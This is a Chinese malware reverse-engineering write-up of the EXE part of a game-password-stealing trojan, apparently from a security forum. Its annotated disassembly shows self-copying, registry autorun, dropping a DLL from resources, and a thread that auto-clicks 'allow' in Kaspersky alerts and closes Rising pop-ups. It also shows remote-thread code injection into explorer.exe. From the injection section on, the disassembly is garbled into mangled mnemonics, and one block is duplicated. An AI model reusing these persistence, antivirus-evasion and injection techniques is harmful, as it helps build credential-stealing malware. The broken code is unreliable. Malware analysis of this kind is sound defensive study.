
# 菜鸟逆向学习:Trojan-PSW.Win32.OnLineGames.diz 木马分析(卡巴斯基命名)------EXE 部分。

> 原文：[`www.pediy.com/kssd/pediy10/60262.html`](https://www.pediy.com/kssd/pediy10/60262.html)

**【文章标题】**: 菜鸟逆向学习:Trojan-PSW.Win32.OnLineGames.diz 木马分析(卡巴斯基命名)------EXE 部分。  

**【文章作者】**: zzy  

**【作者邮箱】**: findmydream@126.com  

**【作者声明】**: 只是感兴趣，没有其他目的。失误之处敬请诸位大侠赐教!  

--------------------------------------------------------------------------------

## 【详细过程】

### 一、 自我复制部分

#### a) 初始化文件路径名

```
00401000             push    ebp  
00401001             mov     ebp, esp  
00401003             sub     esp, 424h  
00401009             push    ebx  
0040100A             push    esi  
0040100B             push    edi  
0040100C             nop  
0040100D             nop  
0040100E             nop  
0040100F             nop  
00401010             nop  
00401011             nop  
00401012             nop  
00401013             nop  
00401014             nop  
00401015             nop  
00401016             nop  
00401017             nop  
00401018             nop  
00401019             nop  
0040101A             nop  
0040101B             nop  
0040101C             nop  
0040101D             nop  
0040101E             nop  
0040101F             nop  
00401020             nop  
00401021             nop  
00401022             nop  
00401023             nop  
00401024             nop  
00401025             nop  
00401026             nop  
00401027             nop  
00401028             nop  
00401029             nop  
0040102A             nop  
0040102B             nop  
0040102C             nop  
0040102D             nop  
0040102E             nop  
0040102F             nop  
00401030             nop  
00401031             nop  
00401032             nop  
00401033             nop  
00401034             nop  
00401035             nop  
00401036             nop  
00401037             nop  
00401038             mov     esi, offset Name ; "51343281"  
0040103D             xor     ebx, ebx  
0040103F             push    esi             ; lpName  
00401040             push    ebx             ; bInheritHandle  
00401041             push    1F0003h         ; dwDesiredAccess  
00401046             call    ds:OpenEventA  
0040104C             test    eax, eax  
0040104E             jnz     loc_4013D0      ; 上一个实例正在初始化状态  
0040104E  
00401054             push    esi             ; lpName  
00401055             push    ebx             ; bInitialState  
00401056             push    ebx             ; bManualReset  
00401057             push    ebx             ; lpEventAttributes  
00401058             call    ds:CreateEventA  ; 创建事件，如果有当前病毒的实例正处于等待状态，将通知该实例退出。  
0040105E             push    1F4h            ; dwMilliseconds  
00401063             mov     esi, eax  
00401065             call    ds:Sleep  
0040106B             push    esi             ; hObject  
0040106C             call    ds:CloseHandle  
00401072             mov     esi, 104h  
00401077             lea     eax, [ebp+szLongPath]  
0040107D             push    esi             ; nSize  
0040107E             push    eax             ; lpFilename  
0040107F             push    ebx             ; hModule  
00401080             mov     [ebp+var_1], 1  
00401084             call    ds:GetModuleFileNameA ; 获取当前进程路径名  
0040108A             mov     edi, ds:GetShortPathNameA  
00401090             lea     eax, [ebp+ModuleFileName]  
00401096             push    esi             ; cchBuffer  
00401097             push    eax             ; lpszShortPath  
00401098             lea     eax, [ebp+szLongPath]  
0040109E             push    eax             ; lpszLongPath  
0040109F             call    edi ; GetShortPathNameA  
004010A1             lea     eax, [ebp+szLongPath]  
004010A7             push    esi             ; uSize  
004010A8             push    eax             ; lpBuffer  
004010A9             call    ds:GetSystemDirectoryA ; 获取 system32 目录  
004010AF             lea     eax, [ebp+LibName_arg_0]  
004010B5             push    esi             ; cchBuffer  
004010B6             push    eax             ; lpszShortPath  
004010B7             lea     eax, [ebp+szLongPath]  
004010BD             push    eax             ; lpszLongPath  
004010BE             call    edi ; GetShortPathNameA  
004010C0             lea     eax, [ebp+szLongPath]  
004010C6             push    esi             ; uSize  
004010C7             push    eax             ; lpBuffer  
004010C8             call    ds:GetWindowsDirectoryA  
004010CE             lea     eax, [ebp+Data]  
004010D4             push    esi             ; cchBuffer  
004010D5             push    eax             ; lpszShortPath  
004010D6             lea     eax, [ebp+szLongPath]  
004010DC             push    eax             ; lpszLongPath  
004010DD             call    edi ; GetShortPathNameA  
004010DF             lea     eax, [ebp+LibName_arg_0]  
004010E5             push    offset asc_403264 ; "\\"  
004010EA             push    eax             ; char *  
004010EB             call    strcat  
004010EB  
004010F0             lea     eax, [ebp+LibName_arg_0]  
004010F6             push    offset s_Upxdnd_dll ; "upxdnd.dll"  
004010FB             push    eax             ; char *  
004010FC             call    strcat          ; X:\Windows\system32\upxdnd.dll  
004010FC  
00401101             lea     eax, [ebp+Data]  
00401107             push    offset asc_403264 ; "\\"  
0040110C             push    eax             ; char *  
0040110D             call    strcat  
0040110D  
00401112             lea     eax, [ebp+Data]  
00401118             push    offset s_Upxdnd_exe ; "upxdnd.exe"  
0040111D             push    eax             ; char *  
0040111E             call    strcat          ; X:\Windows\upxdnd.exe  
```

#### b) 复制 exe 部分 1

当前进程模块路径名不为`%windir%\upxdnd.exe`，则将当前进程程序拷贝到`%windir%\upxdnd.exe`，成功后将`%windir%\upxdnd.exe`在注册表中设为自启动。

```
0040115D             lea     eax, [ebp+Data]  
00401163             push    eax             ; char *  
00401164             lea     eax, [ebp+ModuleFileName]  
0040116A             push    eax             ; char *  
0040116B             call    ds:_stricmp  
00401171             pop     ecx  
00401172             test    eax, eax  
00401174             pop     ecx  
00401175             jz      loc_40121A      ; 当前进程为 X:\Windows\upxdnd.exe 则跳转  
00401175  
0040117B             lea     eax, [ebp+Data]  
00401181             push    ebx             ; bFailIfExists  
00401182             push    eax             ; lpNewFileName  
00401183             lea     eax, [ebp+ModuleFileName]  
00401189             push    eax             ; lpExistingFileName  
0040118A             call    ds:CopyFileA    ; 拷贝到 X:\Windows\upxdnd.exe  
00401190             test    eax, eax  
00401192             jnz     short loc_401205  
00401205 loc_401205:                     ;  
00401205             lea     eax, [ebp+Data]  
0040120B             push    eax             ; lpData  
0040120C             push    offset ValueName ; "upxdnd"  
00401211             call    SetAutoRun      ; 修改注册表将 eax 指向的病毒文件设为自启动  
00401211  
00401216             pop     ecx  
00401217             pop     ecx  
```



### 0) 跳转指令

```
00401218 jmp short loc_40121D
```

#### c) 复制 exe 部分 2：如果上面拷贝到 `%windir%\upxdnd.exe` 失败，则将目标路径名随机命名，再次拷贝到 `%windir%\??????.exe` (`??????` 为随机生成的小写字母)，同时将该随机生成名称的程序设为自启动。

```
00401194 push 0Ah
00401196 push offset s_Upxdnd_exe ; "upxdnd.exe"
0040119B call ConvToRandString ;将 upxdnd.exe 转换为随机字符串(小写字母组成)

004011A0 pop ecx
004011A1 lea eax, [ebp+szLongPath]
004011A7 pop ecx
004011A8 mov dword ptr s_Upxdnd_exe+6, 6578652Eh ;将前面转换得到的随机字符串的后四个字符替换为".exe"
004011B2 push esi ; uSize
004011B3 push eax ; lpBuffer
004011B4 call ds:GetWindowsDirectoryA
004011BA lea eax, [ebp+Data]
004011C0 push esi ; cchBuffer
004011C1 push eax ; lpszShortPath
004011C2 lea eax, [ebp+szLongPath]
004011C8 push eax ; lpszLongPath
004011C9 call edi ; GetShortPathNameA
004011CB lea eax, [ebp+Data]
004011D1 push offset asc_403264 ; "\\"
004011D6 push eax ; char *
004011D7 call strcat

004011DC lea eax, [ebp+Data]
004011E2 push offset s_Upxdnd_exe ; "??????.exe"
004011E7 push eax ; char *
004011E8 call strcat

004011ED add esp, 10h
004011F0 lea eax, [ebp+Data]
004011F6 push ebx ; bFailIfExists
004011F7 push eax ; lpNewFileName
004011F8 lea eax, [ebp+ModuleFileName]
004011FE push eax ; lpExistingFileName
004011FF call ds:CopyFileA ; 拷贝到 windows 目录下并随机命名

00401205 loc_401205: ;
00401205 lea eax, [ebp+Data]
0040120B push eax ; lpData
0040120C push offset ValueName ; "upxdnd"
00401211 call SetAutoRun ; 修改注册表将 eax 指向的病毒文件设为自启动

00401216 pop ecx
00401217 pop ecx
00401218 jmp short loc_40121D
```

#### d) 复制 DLL 部分：从资源中释放 DLL，并拷贝到 `%windir%\System32\upxdnd.dll`。

```
0040121D push ebx ; lpModuleName
0040121E call ds:GetModuleHandleA
00401224 push offset Type ; "DLL"
00401229 push 65h ; lpName
0040122B push eax ; hModule
0040122C mov [ebp+hObject], eax
0040122F call ds:FindResourceA
00401235 push eax ; hResInfo
00401236 mov [ebp+hResData], eax
00401239 push [ebp+hObject] ; hModule
0040123C call ds:SizeofResource
00401242 push [ebp+hResData] ; hResInfo
00401245 mov [ebp+NumberOfBytesWritten], eax
00401248 push [ebp+hObject] ; hModule
0040124B call ds:LoadResource
00401251 push eax ; hResData
00401252 call ds:LockResource
00401258 mov [ebp+lpBuffer], eax
0040125B lea eax, [ebp+LibName_arg_0] ; windows\system32\upxdnd.dll
00401261 push eax ; lpFileName
00401262 call ds:DeleteFileA ; 先删除 upxdnd.dll 文件，以免创建失败。
00401268 push ebx ; hTemplateFile
00401269 push 80h ; dwFlagsAndAttributes
0040126E push 2 ; dwCreationDisposition
00401270 push ebx ; lpSecurityAttributes
00401271 push 1 ; dwShareMode
00401273 lea eax, [ebp+LibName_arg_0]
00401279 push 40000000h ; dwDesiredAccess
0040127E push eax ; lpFileName
0040127F call ds:CreateFileA ; 创建文件:windows\system32\upxdnd.dll
00401285 cmp eax, 0FFFFFFFFh
00401288 mov [ebp+hObject], eax
0040128B jnz loc_401316 ; 创建成功
```

如果创建 `%windir%\System32\upxdnd.dll` 失败，则生成一个小写字母的随机 DLL 名 (`%windir%\System32\??????.dll`)，如果本次生成仍然失败，则跳到程序结束自动结束。

```
00401291 push 0Ah
00401293 push offset s_Upxdnd_dll ; "upxdnd.dll"
00401298 call ConvToRandString ;将 upxdnd. dll 转换为随机字符串(小写字母组成)

0040129D pop ecx
0040129E lea eax, [ebp+szLongPath]
004012A4 pop ecx
004012A5 mov dword ptr s_Upxdnd_dll+6, 6C6C642Eh ;将前面转换得到的随机字符串的后四个字符替换为".dll"
004012AF push esi ; uSize
004012B0 push eax ; lpBuffer
004012B1 call ds:GetSystemDirectoryA
004012B7 lea eax, [ebp+LibName_arg_0]
004012BD push esi ; cchBuffer
004012BE push eax ; lpszShortPath
004012BF lea eax, [ebp+szLongPath]
004012C5 push eax ; lpszLongPath
004012C6 call edi ; GetShortPathNameA
004012C8 lea eax, [ebp+LibName_arg_0]
004012CE push offset asc_403264 ; "\\"
004012D3 push eax ; char *
004012D4 call strcat

004012D9 lea eax, [ebp+LibName_arg_0]
004012DF push offset s_Upxdnd_dll ; "??????.dll"
004012E4 push eax ; char *
004012E5 call strcat

004012EA add esp, 10h
004012ED lea eax, [ebp+LibName_arg_0]
004012F3 push ebx ; hTemplateFile
004012F4 push 80h ; dwFlagsAndAttributes
004012F9 push 2 ; dwCreationDisposition
004012FB push ebx ; lpSecurityAttributes
004012FC push 1 ; dwShareMode
004012FE push 40000000h ; dwDesiredAccess
00401303 push eax ; lpFileName
00401304 call ds:CreateFileA ; 创建随机命名的 DLL 文件
0040130A cmp eax, 0FFFFFFFFh
0040130D mov [ebp+hObject], eax
00401310 jz loc_4013D0
```

生成随机文件名时，使用了下面的函数进行转换，转换后的文件名和之前的文件名仍然是相同长度。

```
0040190D ConvToRandString proc near ; CODE XREF:

0040190D arg_0 = dword ptr 0Ch
0040190D arg_4 = dword ptr 10h

0040190D push esi
0040190E push edi
0040190F call ds:GetTickCount
00401915 push eax ; unsigned int
00401916 call ds:srand
0040191C mov edi, [esp+4+arg_0]
00401920 xor esi, esi
00401922 cmp [esp+4+arg_4], esi
00401926 pop ecx
```



```
00401927             jle     short loc_401942 ; 追加串结尾符
00401927
00401929
00401929             call    ds:rand
0040192F             push    1Ah
00401931             cdq
00401932             pop     ecx
00401933             idiv    ecx            ; rand 函数生成的随机数除以 0x1A(即十进制 26)
00401935             add     dl, 61h       ; 余数再加上 0x61,(即'a'),即随机生成一小写字母
00401938             mov     [esi+edi], dl ; 将上面随机生成的小写字母写入到传给函数的串指针的对应位置
0040193B             inc     esi
0040193C             cmp     esi, [esp+arg_4]
00401940             jl      short loc_401929 ; 未完成串中所有字符的转换则继续
00401942             and     byte ptr [esi+edi], 0 ; 追加串结尾符
00401946             pop     edi
00401947             pop     esi
00401948             retn
00401948
00401948 ConvToRandString endp
```

创建 `DLL` 文件成功后，将资源中的 `DLL` 数据写入该 `DLL` 文件中，然后程序休眠 `200ms`；

```
00401316             lea     eax, [ebp+NumberOfBytesWritten]
00401319             push    ebx            ; lpOverlapped
0040131A             push    eax            ; lpNumberOfBytesWritten
0040131B             push    [ebp+NumberOfBytesWritten] ; nNumberOfBytesToWrite
0040131E             push    [ebp+lpBuffer]  ; lpBuffer
00401321             push    [ebp+hObject]   ; hFile
00401324             call    ds:WriteFile    ; 将资源中的 dll 文件写入到 Windows\system32\upxdnd.dll 或随机命名 DLL 中
0040132A             push    [ebp+hObject]   ; hObject
0040132D             mov     esi, ds:CloseHandle
00401333             call    esi ; CloseHandle
00401335             push    [ebp+hResData]  ; hResData
00401338             call    ds:FreeResource
0040133E             push    0C8h           ; dwMilliseconds
00401343             call    ds:Sleep
```

## 二、 Anti 杀毒软件部分

### a) 创建新的线程 Anti 杀毒软件

```
00401123             add     esp, 20h
00401126             push    ebx            ; lpThreadId
00401127             push    ebx            ; dwCreationFlags
00401128             push    ebx            ; lpParameter
00401129             push    offset AntiAV   ; lpStartAddress
0040112E             push    400h           ; dwStackSize
00401133             push    ebx            ; lpThreadAttributes
00401134             call    ds:CreateThread
0040113A             push    2              ; nPriority
0040113C             push    eax            ; hThread
0040113D             mov     [ebp+hObject], eax
00401140             call    ds:SetThreadPriority
00401146             push    3E8h           ; dwMilliseconds
0040114B             push    [ebp+hObject]   ; hHandle
0040114E             call    ds:WaitForSingleObject  ; 等待线程结束
00401154             push    [ebp+hObject]   ; hObject
00401157             call    ds:CloseHandle
```

### b) AntiAV 线程处理过程，模拟点击卡巴警告窗口中的允许/跳过按钮，自动关闭卡巴和瑞星的提示窗口。

```
004016C9 ; DWORD __stdcall AntiAV(LPVOID)
004016C9 AntiAV         proc near          ; DATA XREF: WinMain(x,x,x,x)+129 o
004016C9
004016C9 String         = byte ptr -24h
004016C9 hWnd           = dword ptr -4
004016C9
004016C9             push    ebp
004016CA             mov     ebp, esp
004016CC             sub     esp, 24h
004016CF             push    ebx
004016D0             push    esi
004016D1             push    edi
004016D2             nop
004016D3             push    0Fh
004016D5             push    offset AVP_AlertDlgClass ; "i~x"
004016DA             call    Decrypt         ; 解密后:AVP.AlertDialog
004016DA
004016DF             push    19h
004016E1             push    offset AVP_NotifyDlg
004016E6             call    Decrypt         ; 解密后:-AVP.Product_Notification
004016E6
004016EB             push    12h
004016ED             push    offset RsRegMonWndName ; "嘭\\xFF 痄赦?
004016F2             call    Decrypt         ; 解密后:瑞星注册表监控提示.
004016F2
004016F7             mov     ebx, ds:FindWindowA
004016FD             mov     esi, ds:PostMessageA
00401703             add     esp, 18h
00401706             xor     edi, edi
00401706
00401708
00401708 loc_401708:                ; CODE XREF: AntiAV+C1 j
00401708                             ; AntiAV+CE j
00401708             push    1              ; dwMilliseconds
0040170A             call    ds:Sleep
00401710             push    edi            ; lpWindowName
00401711             push    offset AVP_AlertDlgClass ; "i~x"
00401716             call    ebx ; FindWindowA ; 查找 AVP 的警告窗口
00401718             cmp     eax, edi
0040171A             jz      short loc_40176D
0040171A
0040171C             push    5              ; uCmd
0040171E             push    eax            ; hWnd
0040171E
0040171F
0040171F loc_40171F:                ; CODE XREF: AntiAV+A2 j
0040171F             call    ds:GetWindow    ; Get handle of a window that has
0040171F                             ; the specified relationship to
0040171F                             ; the specified window
00401725             cmp     eax, edi
00401727             mov     [ebp+hWnd], eax
0040172A             jz      short loc_40176D
0040172A
0040172C             lea     eax, [ebp+String]
0040172F             push    1Fh            ; nMaxCount
00401731             push    eax            ; lpString
00401732             push    [ebp+hWnd]      ; hWnd
00401735             call    ds:GetWindowTextA
0040173B             cmp     dword ptr [ebp+String], 0EDD0CAD4h ; 允许
00401742             jz      short loc_40174D
00401742
00401744             cmp     dword ptr [ebp+String], 0FDB9F8CCh ; 跳过
0040174B             jnz     short loc_401766 ; GW_HWNEXT
0040174B
0040174D
0040174D loc_40174D:                ; CODE XREF: AntiAV+79 j
0040174D             push    edi            ; lParam
0040174E             push    1              ; wParam
00401750             push    201h           ; Msg
00401755             push    [ebp+hWnd]      ; hWnd
00401758             call    esi ; PostMessageA ; 模拟按下鼠标左键
0040175A             push    edi            ; lParam
0040175B             push    edi            ; wParam
0040175C             push    202h           ; Msg
00401761             push    [ebp+hWnd]      ; hWnd
00401764             call    esi ; PostMessageA ; 模拟释放鼠标左键
00401764                             ; 自动点击卡巴警告窗口的允许或跳过按钮
00401764
00401766
00401766 loc_401766:                ; CODE XREF: AntiAV+82 j
00401766             push    2              ; GW_HWNEXT
00401768             push    [ebp+hWnd]
0040176B             jmp     short loc_40171F
0040176B
0040176D ; ---------------------------------------------------------------------------
0040176D
0040176D loc_40176D:                ; CODE XREF: AntiAV+51 j
0040176D                             ; AntiAV+61 j
0040176D             push    edi            ; lpWindowName
0040176E             push    offset s_IX     ; AVP_NotifyDlg+1
00401773             call    ebx ; FindWindowA
00401775             cmp     eax, edi
00401777             jz      short loc_401780
00401777
00401779             push    edi            ; lParam
0040177A             push    edi            ; wParam
0040177B             push    10h            ; Msg
```



### 0040177D AntiAV 相关代码段

```
0040177D                 push    eax             ; hWnd  
0040177E                 call    esi             ; PostMessageA ; 关闭 AVP 的 Notify 窗口  
0040177E  
00401780  
00401780 loc_401780:                           ; CODE XREF: AntiAV+AE j  
00401780                 push    offset RsRegMonWndName ; "嘭\xFF 痄赦?  
00401785                 push    edi             ; lpClassName  
00401786                 call    ebx             ; FindWindowA  
00401788                 cmp     eax, edi  
0040178A                 jz      loc_401708  
0040178A  
00401790                 push    edi             ; lParam  
00401791                 push    edi             ; wParam  
00401792                 push    10h             ; Msg  
00401794                 push    eax             ; hWnd  
00401795                 call    esi             ; PostMessageA ; 关闭瑞星注册表监控提示窗  
00401797                 jmp     loc_401708  
00401797  
00401797 AntiAV          endp  
```

#### 三、 加载病毒释放的 DLL

a) 优先使用注入到 `Exporer.exe` 中加载方式：首先获取 `Explorer.exe` 的 `PID`，然后调用 `InjectCodeToExplorerAndRun(DllPathName, CurProcessPathName, PID)` 注入到 `Explorer.exe`，如果当前进程是 `%windir%\upxdnd.exe`，`CurProcessPathName` 为 `NULL`，否则就是当前进程文件路径名，调用成功后，退出进程。

```
00401349                 push    offset s_Explorer_exe ; "explorer.exe"  
0040134E                call    GetProcessIdByProcessName;获取 Explorer.exe 的进程 ID  
0040134E  
00401353                 cmp     eax, ebx  
00401355                 pop     ecx  
00401356                 jz      short loc_401388  ; 未找到 Explorer.exe 进程  
00401356  
00401358                 cmp     [ebp+var_1], bl ; 当前是否是%windir%\upxdnd.exe 进程  
0040135B                 jnz     short loc_401363  ; 当前不是%windir%\upxdnd.exe  
0040135B  
0040135D               mov     [ebp+ModuleFileName], bl    ; NULL  
0040135D  
00401363  
00401363 loc_401363:                           ;  
00401363                 push    eax             ; ProcessId  
00401364                 lea     eax, [ebp+ModuleFileName]  
0040136A                 push    eax             ; char *  
0040136B                 lea     eax, [ebp+LibName_arg_0]  
00401371                 push    eax             ; char *  
00401372                 call    InjectCodeToExplorerAndRun  
00401372  
00401377                 add     esp, 0Ch  
0040137A                 cmp     eax, ebx  
0040137C                 jz      short loc_401388  
0040137C  
0040137E                 push    eax             ; hObject  
0040137F                 call    esi             ; CloseHandle  
00401381                 push    ebx             ; uExitCode  
00401382                 call    ds:ExitProcess  ; 退出进程  
```

b) 如果没有找到 `Explorer.exe` 的 `PID`，或者注入失败，则从当前进程加载 `DLL`，加载成功后，然后加载 `Dll` 基址+0x30 处所指向的函数，然后一直循环等待，直到有新的病毒实例运行，当有新的病毒实例启动时，加载 `Dll` 基址+0x34 处所指向的函数，然后退出当前病毒实例。

```
00401388                 lea     eax, [ebp+LibName_arg_0]  
0040138E                 push    eax             ; lpLibFileName  
0040138F                 call    ds:LoadLibraryA ; 直接在本进程加载病毒 DLL  
00401395                 mov     edi, eax  
00401397                 cmp     edi, ebx  
00401399                 jz      short loc_4013D0  
00401399  
0040139B                 mov     eax, [edi+30h]  
0040139E                 mov     ecx, [edi+34h]  
004013A1                 cmp     eax, ebx  
004013A3                 mov     [ebp+lpBuffer], ecx  
004013A6                 jz      short loc_4013C9  
004013A6  
004013A8                 cmp     ecx, ebx  
004013AA                 jz      short loc_4013C9  
004013AA  
004013AC                 call    eax             ; 调用 Dll 基址+0x30 处指向的函数  
004013AE                 push    offset Name     ; "51343281"  
004013B3                 push    ebx             ; bInheritHandle  
004013B4                 push    1F0003h         ; dwDesiredAccess  
004013B9                 call    ds:OpenEventA  ;  
004013BF                 cmp     eax, ebx  ; 直到新的实例运行创建事件时，否则一直在此时循环等待。  
004013C1                 jz      short loc_4013AE  
004013C1  
004013C3                 push    eax             ; hObject  
004013C4                 call    esi             ; CloseHandle  
004013C6                 call    [ebp+lpBuffer]  ; 调用 Dll 基址+0x34 处指向的函数  
004013C6  
004013C9  
004013C9                 push    edi             ; hLibModule  
004013CA                 call    ds:FreeLibrary  ; 释放 DLL  
004013CA  
004013D0  
004013D0 loc_4013D0:                           ; CODE XREF: WinMain(x,x,x,x)+4E j  
004013D0                             ; WinMain(x,x,x,x)+310 j  
004013D0                             ; WinMain(x,x,x,x)+399 j  
004013D0                 pop     edi  
004013D1                 pop     esi  
004013D2                 xor     eax, eax  
004013D4                 pop     ebx  
004013D5                 leave  
004013D6                 retn    10h  
```

#### 四、 注入到 `Explorer.exe` 分析

`0040144D` ; `int __cdecl InjectCodeToExplorerAndRun(char *, char *, HMODULE ProcessId)`

```
0040144D var_1C          = dword ptr -1Ch  
0040144D lpStartAddress  = dword ptr -18h        ; 目标进程分配的第二块内存  
0040144D lpBuffer        = dword ptr -14h  
0040144D lpAddress       = dword ptr -10h        ; 目标进程分配的第一块内存  
0040144D var_C           = dword ptr -0Ch        ; 在当前进程分配的第二个内存块  
0040144D hProcess        = dword ptr -8  
0040144D hObject         = dword ptr -4  
0040144D arg_0_LibName   = dword ptr  8  
0040144D arg_4_ModuleName= dword ptr  0Ch  
0040144D ProcessId       = dword ptr  10h        ; 进程 ID/kernel32 句柄  
```

a) 打开 `Explorer.exe` 进程，失败则直接返回

```
0040144D                 push    ebp  
0040144E                 mov     ebp, esp  
00401450                 sub     esp, 1Ch  
00401453                 nop  
00401454                 nop  
00401455                 nop  
00401456                 push    [ebp+ProcessId] ; dwProcessId  
00401459                 push    0               ; bInheritHandle  
0040145B                 push    1F0FFFh         ; dwDesiredAccess  
00401460                 call    ds:OpenProcess  
00401466                 test    eax, eax  
00401468                 mov     [ebp+hObject], eax  
0040146B                 jnz     short loc_40146F  
0040146B  
0040146D                 leave  
0040146E                 retn  
```

b) 在当前病毒实例进程和 `Explorer.exe` 进程分别分配两块内存

```
0040146F                 push    ebx  
00401470                 push    esi  
00401471                 push    edi  
00401472                 call    ds:GetCurrentProcess  
00401478                 and     [ebp+var_1C], 0  
0040147C                 mov     ebx, 1000h  
00401481                 push    ebx             ; dwSize  
00401482                 push    eax             ; hProcess  
00401483                 mov     [ebp+hProcess], eax  
00401486                 call    AllocateMemory  
00401486  
0040148B                 mov     edi, 10000h  
00401490                 mov     esi, eax  
00401492                 push    edi             ; dwSize  
00401493                 push    [ebp+hProcess]  ; hProcess  
00401496                 call    AllocateMemory  
00401496  
0040149B                 push    ebx             ; dwSize  
0040149C                 mov     [ebp+var_C], eax ; 在当前进程分配的第二个内存块  
0040149F                 push    [ebp+hObject]   ; hProcess  
004014A2                 call    AllocateMemory  
004014A2  
004014A7                 push    ebx             ; dwSize  
004014A8                 mov     [ebp+lpAddress], eax ; 目标进程分配的第一块内存  
004014AB                 push    [ebp+hObject]   ; hProcess  
004014AE                 call    AllocateMemory  
004014AE  
004014B3                 add     esp, 20h  
004014B6                 mov     [ebp+lpStartAddress], eax ; 目标进程分配的第二块内存  
004014B9                 test    esi, esi  
004014BB                 jz      loc_40163C  
004014BB  
004014C1                 cmp     [ebp+var_C], 0  ; 在当前进程分配的第二个内存块  
```



004014C5`jzloc_40163C`

004014C5

004014CB`cmp[ebp+lpAddress], 0; 目标进程分配的第一块内存`

004014CF`jzloc_40163C`

004014CF

004014D5`testeax, eax`

004014D7`jzloc_40163C`

c) 从内存的`kernel32.dll`模块中搜索`InternalLoadLibrary`函数(`LoadLibrary`的内层调用)地址（通过`9`个字节的特征串进行搜索）：

004014DD`pushoffset ModuleName; "kernel32.dll"`

004014E2`callds:GetModuleHandleA`

004014E8`pusheidi; dwBytes`

004014E9`push0; uFlags`

004014EB`mov[ebp+ProcessId], eax; 进程 ID/kernel32 句柄`

004014EE`callds:GlobalAlloc`

004014F4`pusheax; hMem`

004014F5`mov[ebp+lpBuffer], eax`

004014F8`callds:GlobalLock`

004014FE`push0; lpNumberOfBytesRead`

00401500`pusheedi; nSize`

00401501`push[ebp+lpBuffer]; lpBuffer`

00401504`push[ebp+ProcessId]; lpBaseAddress`

00401507`push[ebp+hProcess]; hProcess`

0040150A`callds:ReadProcessMemory; 将内存中的 kernel32.dll 起始的 0x10000 个字节读取到刚分配的内存中`

00401510`push9`

00401512`pushoffset loc_403254`

00401517`pusheedi`

00401518`push[ebp+lpBuffer]`

0040151B`callSearchSignInBuffer; 搜索 LoadLibrary 函数的内层调用`

0040151B

00401520`movedi, ds:GetProcAddress`

00401526`addesp, 10h`

00401529`testeax, eax`

0040152B`jzshort loc_401534`

0040152B

0040152D`movecx, [ebp+ProcessId]; 进程 ID/kernel32 句柄`

00401530`addeax, ecx`

00401532`jmpshort loc_40153E`

d) 如果没有搜索到`InternalLoadLibrary`，则直接使用`kernel32.dll`导出的`LoadLibraryA`函数地址：

0040151B`callSearchSignInBuffer; 搜索 LoadLibrary 函数的内层调用`

00401520`movedi, ds:GetProcAddress`

00401526`addesp, 10h`

00401529`testeax, eax`

0040152B`jzshort loc_401534`

00401534`pushoffset ProcName; "LoadLibraryA"`

00401539`push[ebp+ProcessId]; hModule`

0040153C`call edi; GetProcAddress`

e) 将相关函数地址和相关的字符串写入到前面在当前进程中分配的第一块内存中：

```c
typedef struct __RemoteData
{
  DWORD LoadLibraryAAddr;
  DWORD DeleteFileAAddr;
  DWORD OpenEventAAddr;
  DWORD SleepAddr;
  DWORD CloseHandleAddr;
  DWORD FreeLibraryAddr;
  Char DllPathName[MAX_PATH]; %windir%\System32\upxdnd.dll(或随机名的 dll 名)
  Char LoaderPathName[MAX_PATH]:当前病毒实例的路径名
  +220: "51343281"
  ……
} RemoteData;
```

0040153E`pushoffset s_Deletefilea; "DeleteFileA"`

00401543`mov[esi], eax; 写入 LoadLibrary/内层调用函数的地址`

00401545`push[ebp+ProcessId]; hModule`

00401548`call edi; GetProcAddress`

0040154A`pushoffset s_Openeventa; "OpenEventA"`

0040154F`mov[esi+4], eax`

00401552`push[ebp+ProcessId]; hModule`

00401555`call edi; GetProcAddress`

00401557`pushoffset s_Sleep; "Sleep"`

0040155C`mov[esi+8], eax`

0040155F`push[ebp+ProcessId]; hModule`

00401562`call edi; GetProcAddress`

00401564`pushoffset s_Closehandle; "CloseHandle"`

00401569`mov[esi+0Ch], eax`

0040156C`push[ebp+ProcessId]; hModule`

0040156F`call edi; GetProcAddress`

00401571`pushoffset s_Freelibrary; "FreeLibrary"`

00401576`mov[esi+10h], eax`

00401579`push[ebp+ProcessId]; hModule`

0040157C`call edi; GetProcAddress`

0040157E`mov[esi+14h], eax; 以上保存了 6 个函数地址`

00401581`leaeax, [esi+18h]`

00401584`testeax, eax`

00401586`jzshort loc_401593`

00401586

00401588`push[ebp+arg_0_LibName]; char *`

0040158B`pusheax; char *`

0040158C`call strcpy; 第 7 个写入 LibPathName:X:\Windows\System32\upxdnd.dll`

00401591`poxpcc`

00401592`poxpcc`

00401592

00401593

00401593`loc_401593:; CODE XREF: InjectCodeToExplorerAndRun+139 j`

00401593`leaeax, [esi+11Ch]`

00401599`testeax, eax`

0040159B`jzshort loc_4015A8`

0040159B

0040159D`push[ebp+arg_4_ModuleName]; char *`

004015A0`pusheax; char *`

004015A1`call strcpy`

004015A1

004015A6`poxpcc`

004015A7`poxpcc`

004015A7

004015A8

004015A8`loc_4015A8:; CODE XREF: InjectCodeToExplorerAndRun+14E j`

004015A8`leaeax, [esi+220h]`

004015AE`pushoffset Name; "51343281"`

004015B3`pusheax; char *`

004015B4`call strcpy; 在当前进程分配的第一块内存中写入相关函数地址，及相关字符串。`

f) 下面将`RemoteThreadProc`函数代码拷贝到在当前病毒进程中分配的第二块内存中

004015B9`movedi, offset InjectCodeToExplorerAndRun`

004015BE`moveax, offset RemoteThreadProc`

004015C3`subedi, eax`

004015C5`pusheedi; dwSize`

004015C6`push[ebp+var_C]; lpBuffer`

004015C9`pusheax; lpAddress`

004015CA`push[ebp+hProcess]; hProcess`

004015CD`call CopyMemory; 将函数 RemoteThreadProc 写入当前进程分配的第二块内存中`

004015D2`addesp, 18h`

004015D5`testeax, eax`

004015D7`jzshort loc_401623`

g) 将当前进程中两个内存块中的数据写到`Explorer.exe`进程中，第一块内存为相关函数地址，病毒 DLL 的路径名，病毒 EXE 的路径名，还有一个字符串，第二块内存保存为欲在`Explorer.exe`进程中执行的函数，然后创建远线程，注入到`Explorer.exe`进程，指向第一块内存的指针作为远线程处理函数的参数，因此在远线程处理函数中可以使用第一个内存块中那些相关数据。

004015D9`push230h; dwSize`

004015DE`pusheesi; lpBuffer`

004015DF`push[ebp+lpAddress]; lpAddress`

004015E2`push[ebp+hObject]; hProcess`

004015E5`call WriteToProcess; 将当前进程第一块内存区数据拷贝到目标进程第一块内存中`

004015E5

004015EA`addesp, 10h`

004015ED`testeax, eax`

004015EF`jzshort loc_401623`

004015EF

004015F1`pusheedi; dwSize`

004015F2`push[ebp+var_C]; lpBuffer`

004015F5`push[ebp+lpStartAddress]; lpAddress`

004015F8`push[ebp+hObject]; hProcess`

004015FB`call WriteToProcess; 将当前进程第二块内存区中的函数写入目标进程第二块内存区中`

